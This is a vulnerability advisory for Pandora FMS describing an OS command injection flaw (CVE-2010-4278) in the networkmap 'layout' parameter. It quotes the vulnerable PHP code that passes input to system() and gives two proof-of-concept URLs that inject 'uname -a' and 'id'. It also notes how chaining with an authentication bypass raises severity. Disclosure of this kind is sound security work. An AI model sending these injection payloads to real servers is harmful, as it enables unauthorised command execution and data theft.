[+] Introduction

Pandora FMS (for Pandora Flexible Monitoring System) is a software
solution for monitoring computer networks. It allows monitoring in a
visual way the status and performance of several parameters from
different operating systems, servers, applications and hardware systems
such as firewalls, proxies, databases, web servers or routers.

It can be deployed in almost any operating system. It features remote
monitoring (WMI, SNMP, TCP. UDP, ICMP, HTTP...) and it can also use
agents. An agent is available for each platform. It can also monitor
hardware systems with a TCP/IP stack, such as load balancers, routers,
network switches, printers or firewalls.

This software has several servers that process and get information from
different sources, using WMI for gathering remote Windows information, a
predictive server, a plug-in server which makes complex user-defined
network tests, an advanced export server to replicate data between
different sites of Pandora FMS, a network discovery server, and an SNMP
Trap console.

Released under the terms of the GNU General Public License, Pandora FMS
is free software.

2) OS Command Injection - CVE-2010-4278 - CVSS 9/10

The layout parameter in file operation/agentes/networkmap.php is not
properly filtered and allows an attacker to inject OS commands.

Snippet of vulnerable code (file operation/agentes/networkmap.php):

32 $layout = (string) get_parameter ('layout', 'radial');
...
137 $filename_map = $config["attachment_store"]."/networkmap_".$layout;
138 $filename_img = "attachment/networkmap_".$layout."_".$font_size;
139 $filename_dot = $config["attachment_store"]."/networkmap_".$layout;
...
162                 $cmd = "$filter -Tcmapx -o".$filename_map." -Tpng
- -o".$filename_img." ".$filename_dot;
163                 $result = system ($cmd);

PoC:

http://servername/pandora_console/index.php?login=1&login=1&sec=estado&sec2=operation/agentes/networkmap&refr=0&layout=1;uname%20-a;
http://servername/pandora_console/index.php?login=1&sec=estado&sec2=operation/agentes/networkmap&refr=0&layout=1;id;

If we use vulnerability #1 (that permits bypass the authentication
system and login as admin) with this issue, the CVSS will be 10/10.


[+] Impact

An attacker can execute commands of the operating system, inject remote
code in the context of the application, get arbitrary files from the
filesystem or extract any data of the database including passwords and
confidential information about the monitored network/systems. Also it is
possible to bypass the authentication or scale privileges to became
admin, gaining full control of the web application and web server. These
vulnerabilities have a high impact to the confidentiality, integrity,
and availability of the system.
